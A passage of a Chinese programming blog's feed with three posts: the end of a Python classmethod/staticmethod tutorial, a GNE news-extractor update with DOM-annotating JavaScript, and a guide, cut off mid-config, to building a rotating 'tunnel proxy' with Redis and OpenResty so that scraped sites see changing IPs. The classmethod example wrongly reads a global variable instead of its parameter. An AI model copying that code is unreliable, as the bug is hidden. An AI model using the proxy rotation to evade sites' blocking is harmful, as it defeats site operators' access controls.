alt></p><p>类方法使用装饰器<code>@classmethod</code>来装饰，并且它的第一个参数是隐式参数<code>cls</code>。这个参数其实就是<code>People</code>这个类本身。这个隐式参数在我们调用类方法的时候，是不需要传入的。在这个类方法里面，相当于使用<code>People</code>初始化了一个实例，然后把这个实例返回了出去。</p><p>这样做有什么好处呢？好处就在于我们完全不需要修改<code>__init__</code>，那么，也就不需要修改代码里面其它调用了<code>People</code>类的地方。例如现在我又想增加从英文句子里面提取名字和年龄的功能，那么我只需要再添加一个类方法就可以了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, age)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">introduce_myself</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">f'大家好，我叫: <span class="subst">&#123;self.name&#125;</span>'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_two_string_num</span><span class="params">(a, b)</span>:</span></span><br><span class="line">        a_int = int(a)</span><br><span class="line">        b_int = int(b)</span><br><span class="line">        <span class="keyword">return</span> a_int + b_int</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">from_chinese_string</span><span class="params">(cls, sentence)</span>:</span></span><br><span class="line">        name = re.search(<span class="string">'名字：(.*?)，'</span>, content).group(<span class="number">1</span>)</span><br><span class="line">        age = re.search(<span class="string">'年龄：(\d+)'</span>, content).group(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> cls(name, age)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">from_english_string</span><span class="params">(cls, sentence)</span>:</span></span><br><span class="line">        name = re.search(<span class="string">'name: (.*?),'</span>, content).group(<span class="number">1</span>)</span><br><span class="line">        age = re.search(<span class="string">'age: (\d+)'</span>, content).group(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> cls(name, age)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">calc_age_after_n_year</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        age = People.add_two_string_num(self.age, n)</span><br><span class="line">        print(<span class="string">f'<span class="subst">&#123;n&#125;</span>年以后，我<span class="subst">&#123;age&#125;</span>岁'</span>)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">content = <span class="string">'my name: kinganme, my age: 15 please extract them'</span></span><br><span class="line">kingname = People.from_english_string(content)</span><br><span class="line">kingname.introduce_myself()</span><br><span class="line">kingname.calc_age_after_n_year(<span class="number">10</span>)</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20211008190831.png" alt></p><blockquote><p>一句话总结：当你想使用工厂模式，根据不同的参数生成同一个类的不同对象的时候，就可以使用类方法。</p></blockquote><p>其实如果大家使用过Python自带的<code>datetime</code>模块，你就会发现类方法无处不在：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">dt0 = datetime.datetime(<span class="number">2021</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">19</span>, <span class="number">10</span>, <span class="number">5</span>)</span><br><span class="line">now = datetime.datetime.now()</span><br><span class="line">dt = datetime.datetime.fromtimestamp(<span class="number">1633691412</span>)</span><br><span class="line">dt2 = datetime.datetime.fromisoformat(<span class="string">'2021-10-08 19:10:05'</span>)</span><br></pre></td></tr></table></figure><p>这段代码里面的<code>.now()</code>、<code>.fromtimestamp()</code>和 <code>.fromisoformat()</code>，都是类方法。他们最终返回的都是<code>datetime.datetime</code>对象。但是他们是根据不同类型的输入参数生成的。</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/640.gif" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;有同学在知识星球上问我，什么情况下使用静态方法，什么情况下使用类方法。今天我们就来捋一下这两个方法的应用场景。&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="https://www.kingname.info/categories/Python/"/>
    
    
      <category term="Python" scheme="https://www.kingname.info/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>GNE 版本升级，基于可视化信号自动化识别并提取新闻正文</title>
    <link href="https://www.kingname.info/2021/10/07/gne-0-3-0/"/>
    <id>https://www.kingname.info/2021/10/07/gne-0-3-0/</id>
    <published>2021-10-07T08:18:23.000Z</published>
    <updated>2021-10-07T08:22:29.717Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-10-07-16-05-00.png" alt></p><p>GNE 是一个通用的新闻正文抽取器，自从开源以来，已经被很多人用来作为新闻正文通用爬虫的重要组件。</p><p>GNE 的 Github 地址：<a href="https://github.com/GeneralNewsExtractor/GeneralNewsExtractor" target="_blank" rel="noopener">https://github.com/GeneralNewsExtractor/GeneralNewsExtractor</a>。算法来自于<a href="https://kns.cnki.net/KCMS/detail/detail.aspx?dbcode=CJFQ&amp;dbname=CJFDLAST2019&amp;filename=GWDZ201908029&amp;v=MDY4MTRxVHJXTTFGckNVUkxPZmJ1Wm5GQ2poVXJyQklqclBkTEc0SDlqTXA0OUhiWVI4ZVgxTHV4WVM3RGgxVDM=" target="_blank" rel="noopener">《基于文本及符号密度的网页正文提取方法》</a>，这个算法是完全基于 HTML 里面的信息来寻找正文。因此，它有一些先天性缺陷：</p><ol><li>如果正文只有三五句话，但评论是长篇大论，提取就会失败</li><li>如果正文里面 html 标签太多，也会导致正文找错位置</li><li>经常提取到版权信息</li></ol><p>但如果让人来看网页，就不会搞错。因为正文的位置和评论的位置肯定不一样，版权信息一般在最下面……这些可视化信号，是通过 CSS 来确定的，单纯从 HTML 中是看不到的。</p><p>GNE 输入的HTML，原本就是使用模拟浏览器输出的 HTML，并不是真正的网页源代码。既然如此，在使用模拟浏览器的时候，为什么不直接把每个节点的坐标信息都记录下来呢？在使用模拟浏览器的时候，只需要执行一段 JavaScript 代码，就可以把每个节点是否可见，每个可见节点的长宽高、左上角、右下角的坐标记录下来。这样，GNE 在解析正文的时候，可以参考这些信息，直接移除不可见的节点，并移除尺寸显然不合理、位置显然不正确的节点。从而大大提高正文识别的准确率。</p><a id="more"></a><p>基于可视化信号的提取效果如何呢？我们用一篇新闻来作为例子：<a href="https://www.163.com/dy/article/G33O1QTA05372UZS.html" target="_blank" rel="noopener">广西省发生了一起事件，位置在来宾市，画面曝光</a>。</p><p>首先在浏览器的开发者工具里面，直接复制经过js 渲染后的源代码：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-10-07-15-44-28.png" alt></p><p>当我们直接使用 GNE识别正文的时候，运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-10-07-15-46-34.png" alt></p><p>可以看到，提取到的信息是版权信息。</p><p>现在，如果使用经过修改的 HTML 代码，就能成功提取到正文，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-10-07-15-47-43.png" alt></p><p>那么，这个经过修改的 HTML 有什么特别呢？我们来看看它长什么样：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-10-07-15-48-39.png" alt></p><p>在<code>body</code> 标签下面的所有节点，都有一个属性叫做 <code>is_visiable</code> ，它的值是字符串的 <code>true</code> 或者 <code>false</code> 。如果值为 <code>true</code> ,<br>那么，还有一个属性叫做 <code>coordinate</code> 。它的值是一个 JSON 字符串，包含了这个节点的尺寸，坐标等信息。</p><p>那么，这些特殊的 HTML 是怎么生成的呢？如果你只是想做一个临时测试，那么其实只需要在Chrome 的开发者工具的<code>Console(控制台)</code>标签页执行这样一段 js 代码就可以了：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert_visiability_info</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_body</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> body = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'body'</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">return</span> body</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">insert_info</span>(<span class="params">element</span>) </span>&#123;</span><br><span class="line">        is_visiable = element.offsetParent !== <span class="literal">null</span></span><br><span class="line">        element.setAttribute(<span class="string">'is_visiable'</span>, is_visiable)</span><br><span class="line">        <span class="keyword">if</span> (is_visiable) &#123;</span><br><span class="line">            react = element.getBoundingClientRect()</span><br><span class="line">            coordinate = <span class="built_in">JSON</span>.stringify(react)</span><br><span class="line">            element.setAttribute(<span class="string">'coordinate'</span>, coordinate)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">iter_node</span>(<span class="params">node</span>) </span>&#123;</span><br><span class="line">        children = node.children</span><br><span class="line">        insert_info(node)</span><br><span class="line">        <span class="keyword">if</span> (children.length !== <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">const</span> element <span class="keyword">of</span> children) &#123;</span><br><span class="line">                iter_node(element)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">sizes</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> contentWidth = [...document.body.children].reduce( </span><br><span class="line">          (a, el) =&gt; <span class="built_in">Math</span>.max(a, el.getBoundingClientRect().right), <span class="number">0</span>) </span><br><span class="line">          - <span class="built_in">document</span>.body.getBoundingClientRect().x;</span><br><span class="line">      </span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">          windowWidth:  <span class="built_in">document</span>.documentElement.clientWidth,</span><br><span class="line">          windowHeight: <span class="built_in">document</span>.documentElement.clientHeight,</span><br><span class="line">          pageWidth:    <span class="built_in">Math</span>.min(<span class="built_in">document</span>.body.scrollWidth, contentWidth),</span><br><span class="line">          pageHeight:   <span class="built_in">document</span>.body.scrollHeight,</span><br><span class="line">          screenWidth:  <span class="built_in">window</span>.screen.width,</span><br><span class="line">          screenHeight: <span class="built_in">window</span>.screen.height,</span><br><span class="line">          pageX:        <span class="built_in">document</span>.body.getBoundingClientRect().x,</span><br><span class="line">          pageY:        <span class="built_in">document</span>.body.getBoundingClientRect().y,</span><br><span class="line">          screenX:     -<span class="built_in">window</span>.screenX,</span><br><span class="line">          screenY:     -<span class="built_in">window</span>.screenY - (<span class="built_in">window</span>.outerHeight-<span class="built_in">window</span>.innerHeight),</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">insert_page_info</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        page_info = sizes()</span><br><span class="line">        node = <span class="built_in">document</span>.createElement(<span class="string">'meta'</span>)</span><br><span class="line">        node.setAttribute(<span class="string">'name'</span>, <span class="string">'page_visiability_info'</span>)</span><br><span class="line">        node.setAttribute(<span class="string">'page_info'</span>, <span class="built_in">JSON</span>.stringify(page_info))</span><br><span class="line">        <span class="built_in">document</span>.getElementsByTagName(<span class="string">'head'</span>)[<span class="number">0</span>].appendChild(node)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    insert_page_info()</span><br><span class="line">    body = get_body()</span><br><span class="line">    iter_node(body)</span><br><span class="line">&#125;</span><br><span class="line">insert_visiability_info()</span><br></pre></td></tr></table></figure><p>如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-10-07-15-53-51.png" alt></p><p>执行完成以后，重新打开<code>Elements(元素)</code>标签页，就可以看到我们需要的属性已经添加到了各个节点里面。</p><p>如果你想要使用 Puppeteer 或者 Selenium 来实现同样爬虫，想批量自动化执行 JavaScript，我给出一个 Demo，大家可以参考：<a href="https://github.com/GeneralNewsExtractor/GneRender" target="_blank" rel="noopener">GitHub - GeneralNewsExtractor/GneRender: Render web page to add necessary info on every dom element.</a>.</p><p>只需要执行如下几个命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yarn install</span><br><span class="line">node render.js</span><br></pre></td></tr></table></figure><p>就可以在当前文件夹下面生成一个<code>test.html</code>，就这是经过修改的特殊 HTML 了。</p><p>最新版本的 GNE 已经提交到了 Pypi，大家现在可以直接试用 pip 安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install gne</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-10-07-16-05-00.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;GNE 是一个通用的新闻正文抽取器，自从开源以来，已经被很多人用来作为新闻正文通用爬虫的重要组件。&lt;/p&gt;
&lt;p&gt;GNE 的 Github 地址：&lt;a href=&quot;https://github.com/GeneralNewsExtractor/GeneralNewsExtractor&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/GeneralNewsExtractor/GeneralNewsExtractor&lt;/a&gt;。算法来自于&lt;a href=&quot;https://kns.cnki.net/KCMS/detail/detail.aspx?dbcode=CJFQ&amp;amp;dbname=CJFDLAST2019&amp;amp;filename=GWDZ201908029&amp;amp;v=MDY4MTRxVHJXTTFGckNVUkxPZmJ1Wm5GQ2poVXJyQklqclBkTEc0SDlqTXA0OUhiWVI4ZVgxTHV4WVM3RGgxVDM=&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;《基于文本及符号密度的网页正文提取方法》&lt;/a&gt;，这个算法是完全基于 HTML 里面的信息来寻找正文。因此，它有一些先天性缺陷：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;如果正文只有三五句话，但评论是长篇大论，提取就会失败&lt;/li&gt;
&lt;li&gt;如果正文里面 html 标签太多，也会导致正文找错位置&lt;/li&gt;
&lt;li&gt;经常提取到版权信息&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;但如果让人来看网页，就不会搞错。因为正文的位置和评论的位置肯定不一样，版权信息一般在最下面……这些可视化信号，是通过 CSS 来确定的，单纯从 HTML 中是看不到的。&lt;/p&gt;
&lt;p&gt;GNE 输入的HTML，原本就是使用模拟浏览器输出的 HTML，并不是真正的网页源代码。既然如此，在使用模拟浏览器的时候，为什么不直接把每个节点的坐标信息都记录下来呢？在使用模拟浏览器的时候，只需要执行一段 JavaScript 代码，就可以把每个节点是否可见，每个可见节点的长宽高、左上角、右下角的坐标记录下来。这样，GNE 在解析正文的时候，可以参考这些信息，直接移除不可见的节点，并移除尺寸显然不合理、位置显然不正确的节点。从而大大提高正文识别的准确率。&lt;/p&gt;
    
    </summary>
    
      <category term="GNE" scheme="https://www.kingname.info/categories/GNE/"/>
    
    
      <category term="GNE" scheme="https://www.kingname.info/tags/GNE/"/>
    
      <category term="通用爬虫" scheme="https://www.kingname.info/tags/%E9%80%9A%E7%94%A8%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>只要5分钟，创建一个隧道代理</title>
    <link href="https://www.kingname.info/2021/07/24/build-tunnel-proxy/"/>
    <id>https://www.kingname.info/2021/07/24/build-tunnel-proxy/</id>
    <published>2021-07-24T00:54:53.000Z</published>
    <updated>2021-07-24T00:56:46.528Z</updated>
    
    <content type="html"><![CDATA[<p>什么是隧道代理？我们来看下面这张截图：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-23-08-41-21.png" alt></p><p>所谓隧道代理，就是一个能帮你自动更换代理 IP 的代理服务。在你的代码里面，你只需要把一个入口代理地址写死，然后正常发起请求，而目标服务器接收到的请求，每一次都是不同的代理地址。</p><p>在某代理网站上，隧道代理50并发每秒的价格是4000元/月：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-23-08-47-07.png" alt></p><p>而常规的，先请求接口拿到一批代理 IP，再选一个发起请求的原始代理服务器，一个月价格才600多元：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-23-08-49-41.png" alt></p><p>所以，如果我们能自己做一个隧道代理，将会省下很多钱！</p><a id="more"></a><p>隧道代理的原理，跟常规代理的不同之处，用下面这两张图就能说清楚：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-23-21-08-36.png" alt="传统代理服务"></p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-23-21-11-06.png" alt="隧道代理"></p><p>要自己开发一个这样的隧道代理，我们需要做两步：</p><ol><li>构建一个代理池</li><li>实现代理自动转发</li></ol><h2 id="构建代理池"><a href="#构建代理池" class="headerlink" title="构建代理池"></a>构建代理池</h2><p>假设你从代理供应商手上买到的便宜代理地址为：<code>http://xxx.com/ips</code>，直接在浏览器上面请求，页面效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20210723163643.png" alt></p><p>现在，你需要做的就是写一个程序，周期性访问这个url，拉取当前最新可用的IP地址，然后把它放到Redis中。</p><p>这里，我们使用Redis的Hash这个数据结构，其中Hash的字段名就是<code>IP:端口</code>，里面的值就是跟每个IP相关的一些信息。</p><p>你这个程序需要确保，当前在Redis里面的代理地址，全部都是可用的。这里，我给出了一个示例程序：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">ProxyManager.py</span></span><br><span class="line"><span class="string">~~~~~~~~~~~~~~~~~~~~~</span></span><br><span class="line"><span class="string">简易代理池管理工具，直接从URL中读取所有</span></span><br><span class="line"><span class="string">最新的代理，并写入Redis。</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyManager</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.config = self.read_config()</span><br><span class="line">        self.redis_config = self.config[<span class="string">'redis'</span>]</span><br><span class="line">        self.client = redis.Redis(host=self.redis_config[<span class="string">'host'</span>],</span><br><span class="line">                                  password=self.redis_config[<span class="string">'password'</span>],</span><br><span class="line">                                  port=self.redis_config[<span class="string">'port'</span>])</span><br><span class="line">        self.instance_dict = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_config</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'config.yaml'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            config = yaml.safe_load(f.read())</span><br><span class="line">            <span class="keyword">return</span> config</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_ip</span><span class="params">(self)</span>:</span></span><br><span class="line">        resp = requests.get(self.config[<span class="string">'proxy'</span>]).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'&#123;'</span> <span class="keyword">in</span> resp:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        proxy_list = resp.split()</span><br><span class="line">        <span class="keyword">return</span> proxy_list</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">delete_ip</span><span class="params">(self, live_ips, pool_ips)</span>:</span></span><br><span class="line">        ip_to_removed = set(pool_ips) - set(live_ips)</span><br><span class="line">        <span class="keyword">if</span> ip_to_removed:</span><br><span class="line">            print(<span class="string">'ip to be removed:'</span>, ip_to_removed)</span><br><span class="line">            self.client.hdel(self.redis_config[<span class="string">'key'</span>], *list(ip_to_removed))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_new_ips</span><span class="params">(self, live_ips, pool_ips)</span>:</span></span><br><span class="line">        ip_to_add = set(live_ips) - set(pool_ips)</span><br><span class="line">        <span class="keyword">if</span> ip_to_add:</span><br><span class="line">            print(<span class="string">'ip to add:'</span>, ip_to_add)</span><br><span class="line">            ips = &#123;&#125;</span><br><span class="line">            <span class="keyword">for</span> ip <span class="keyword">in</span> ip_to_add:</span><br><span class="line">                ips[ip] = json.dumps(&#123;<span class="string">'private_ip'</span>: ip,</span><br><span class="line">                                      <span class="string">'ts'</span>: datetime.datetime.now().strftime(<span class="string">'%Y-%m-%d %H:%M:%S'</span>)&#125;)</span><br><span class="line">            self.client.hset(self.redis_config[<span class="string">'key'</span>], mapping=ips)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            live_ips = self.read_ip()</span><br><span class="line">            pool_ips = [x.decode() <span class="keyword">for</span> x <span class="keyword">in</span> self.client.hgetall(self.redis_config[<span class="string">'key'</span>])]</span><br><span class="line">            self.delete_ip(live_ips, pool_ips)</span><br><span class="line">            self.add_new_ips(live_ips, pool_ips)</span><br><span class="line">            time.sleep(<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    manager = ProxyManager()</span><br><span class="line">    manager.run()</span><br></pre></td></tr></table></figure><p>其中，我把Redis相关的配置、代理供应商的URL写到了一个yaml配置文件中，防止被你们看到。配置文件的格式如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-23-21-13-08.png" alt></p><p>由于我这个代理供应商提供的IP，有效期是1-5分钟，所以保险起见，我每40秒更换一次IP。更换的时候，采用了增量更换的方式。把当前拉取的IP和Redis里面的已有IP进行对比。不在这次拉取的IP全部从Redis移除，然后把新增的IP加到Redis中。</p><p>大家在实际过程中，还可以加一些代理校验的逻辑，确保从URL拉下来的代理也进行有效性检查，发现无效的立刻移除。</p><h2 id="实现自动转发"><a href="#实现自动转发" class="headerlink" title="实现自动转发"></a>实现自动转发</h2><p>要实现自动转发，我们可以使用<a href="https://openresty.org/cn/" target="_blank" rel="noopener">OpenResty</a>。这是一个基于Nginx和Lua实现的高性能Web平台。通过它，我们可以使用Lua语言实现一些逻辑，例如从Redis读取数据，把来源请求转发到上游代理服务器……</p><p>因此，我们使用OpenResty搭建一个转发服务。并把这个转发服务所在服务器的IP地址作为我们的入口IP地址。在使用Requests等等网络请求客户端发送请求的时候，只需要把这个入口IP地址设置为代理。那么，当客户端发送请求的时候，请求首先到了OpenResty。然后它从Redis中随机选一个代理IP来作为上游代理，并把刚刚发来的请求转发到上游代理。从而实现隧道代理的效果。</p><p>Lua是一门非常老的语言，它的语法不少地方跟Python不太一样。不过你不用担心，这个配置文件我已经写好了。大家拿过来改一改就能用。</p><p>对应的配置文件如下图所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">worker_processes  16;        #nginx worker 数量</span><br><span class="line">error_log /usr/local/openresty/nginx/logs/error.log;   #指定错误日志文件路径</span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections 1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">stream &#123;</span><br><span class="line">    ## TCP 代理日志格式定义</span><br><span class="line">    log_format 